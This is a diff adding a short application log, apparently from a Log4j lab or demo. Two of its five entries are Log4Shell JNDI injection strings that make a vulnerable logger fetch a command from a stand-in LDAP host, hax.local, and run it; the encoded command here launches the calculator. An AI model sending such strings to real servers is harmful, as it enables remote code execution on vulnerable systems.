@@ -1,0 +1,5 @@
+2022-10-14 18:33:30 ERROR App:32 - hi
+2022-10-14 18:33:55 ERROR App:32 - ${jndi:ldap://hax.local:1389/Basic/Command/Base64/Y2FsYy5leGU=}
+2022-10-14 18:58:37 ERROR App:32 - dd
+2022-10-14 19:12:52 ERROR App:32 - John
+2022-10-14 19:13:11 ERROR App:32 - ${jndi:ldap://hax.local:1389/Basic/Command/Base64/Y2FsYy5leGU=}
